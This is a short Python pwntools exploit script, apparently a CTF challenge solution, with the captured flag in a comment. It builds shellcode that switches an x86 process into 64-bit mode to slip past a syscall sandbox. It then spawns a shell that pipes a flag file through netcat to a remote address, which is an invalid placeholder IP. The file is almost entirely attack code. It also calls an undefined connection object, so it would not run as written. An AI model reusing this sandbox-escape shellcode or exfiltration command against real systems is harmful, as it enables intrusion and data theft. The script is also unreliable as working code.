#!/usr/bin/env python
from pwn import *
from base64 import b64encode as b64en
import re

# MeePwnCTF{Unicorn_Engine_Is_So_Good_But_Not_Perfect}

#y = process( './bin' )
#pause()

x86 = asm('''
    call y              /* leave eip address on stack */
y:
    pop ebx             /* pop get rip address */
    mov eax, 0x33       /* cs 0x33 -> 64bit mode */
    push eax
    add ebx, 0xc
    push ebx
    retf                /* retf instruction to switch to 64bit mode -> different syscall number to bypass sanbox */
''')


context.arch = 'amd64'

#cmd = 'ls | nc 12.345.666.77 3333'
cmd = 'cat flag | nc 12.345.666.77 3333'

x64 = asm(
    shellcraft.pushstr_array('rsi' , ['sh','-c',cmd]) + 
    '''
    xor rdx, rdx
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    mov rax, 0x3b
    syscall
''')

print b64en( x86 + x64 )

y.send( x86 + x64 )

y.interactive()